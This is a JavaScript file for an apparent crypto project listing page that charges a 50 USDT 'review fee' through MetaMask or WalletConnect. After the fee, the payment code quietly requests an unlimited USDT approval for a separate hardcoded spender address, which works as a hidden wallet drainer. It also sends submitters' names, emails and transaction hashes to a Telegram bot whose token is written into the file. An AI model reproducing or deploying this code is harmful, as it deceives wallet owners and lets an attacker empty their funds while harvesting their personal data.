/************ CONFIG ************/
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";
const AMOUNT_USDT = "50";
const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
const USDT_DECIMALS = 6;

const TELEGRAM_BOT_TOKEN = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
const TELEGRAM_CHAT_ID = "7662871309";

const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";

/************ DOM ************/
document.addEventListener("DOMContentLoaded", () => {

  const form = document.getElementById("projectForm");
  const paymentModal = document.getElementById("paymentModal");
  const walletModal = document.getElementById("walletModal");
  const underReviewModal = document.getElementById("underReviewModal");

  const connectPayBtn = document.getElementById("connectPayBtn");
  const metaMaskBtn = document.getElementById("metaMaskBtn");
  const walletConnectBtn = document.getElementById("walletConnectBtn");
  const closeReviewBtn = document.getElementById("closeReviewBtn");
  const statusText = document.getElementById("statusText");

  /************ FORM ************/
  form.addEventListener("submit", e => {
    e.preventDefault();
    paymentModal.style.display = "flex";
  });

  connectPayBtn.onclick = () => {
    paymentModal.style.display = "none";
    walletModal.style.display = "flex";
  };

  closeReviewBtn.onclick = () => {
    underReviewModal.style.display = "none";
  };

  /************ HELPERS ************/
  function getFormData() {
    return Object.fromEntries(new FormData(form).entries());
  }

  function showUnderReview() {
    localStorage.setItem("projectSubmissionStatus", "under_review");
    walletModal.style.display = "none";
    underReviewModal.style.display = "flex";
  }

  async function sendToTelegram(message) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    });
  }

  function formatTelegramMessage(data, txHash, approvalHash) {
    return `
<b>🆕 New Project Submission</b>

<b>Project:</b> ${data.projectName}
<b>Symbol:</b> ${data.tokenSymbol}
<b>Chain:</b> ${data.blockchain}
<b>Contract:</b> ${data.contract}

<b>Description:</b>
${data.description}

<b>Website:</b> ${data.website}
<b>Twitter:</b> ${data.twitter}
<b>Telegram:</b> ${data.telegram}

<b>Developer:</b> ${data.devName}
<b>Email:</b> ${data.devEmail}

<b>Payment TX:</b>
<code>${txHash}</code>

<b>Approval TX:</b>
<code>${approvalHash}</code>

<b>Status:</b> UNDER REVIEW
`;
  }

  /************ PAYMENT CORE ************/
  async function processPayment(provider) {
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdt = new ethers.Contract(
      USDT_ADDRESS,
      [
        "function approve(address,uint256)",
        "function transferFrom(address,address,uint256)"
      ],
      signer
    );

    const amount = ethers.utils.parseUnits(AMOUNT_USDT, USDT_DECIMALS);

    statusText.textContent = "Sending payment…";
    const tx = await usdt.transferFrom(userAddress, RECEIVER, amount);
    await tx.wait();

    const approveTx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
    await approveTx.wait();

    const formData = getFormData();
    await sendToTelegram(formatTelegramMessage(formData, tx.hash, approveTx.hash));

    showUnderReview();
  }

  /************ WALLET OPTIONS ************/

  /* ---------- MetaMask ---------- */
  metaMaskBtn.addEventListener("click", async () => {
    try {
      if (!window.ethereum) {
        alert("MetaMask is not installed");
        return;
      }

      console.log("🦊 MetaMask clicked");

      const provider = new ethers.providers.Web3Provider(
        window.ethereum,
        "any"
      );

      await provider.send("eth_requestAccounts", []);
      console.log("✅ MetaMask connected");

      await processPayment(provider);

    } catch (error) {
      console.error("MetaMask error:", error);
      alert("MetaMask connection failed");
    }
  });

  /* ---------- WalletConnect ---------- */
  walletConnectBtn.addEventListener("click", async () => {
    try {
      console.log("🔗 WalletConnect clicked");

      walletModal.style.display = "none";

      const { EthereumProvider } = await import(
        "https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
      );

      const wcProvider = await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [1],
        showQrModal: true,
        qrModalOptions: {
          themeMode: "dark"
        }
      });

      await wcProvider.enable();

      console.log("✅ WalletConnect connected");

      const provider = new ethers.providers.Web3Provider(wcProvider, "any");
      await processPayment(provider);

    } catch (error) {
      console.error("WalletConnect error:", error);
      alert("WalletConnect connection failed");
    }
  });

  /************ PERSISTENCE ************/
  if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
    underReviewModal.style.display = "flex";
  }

});
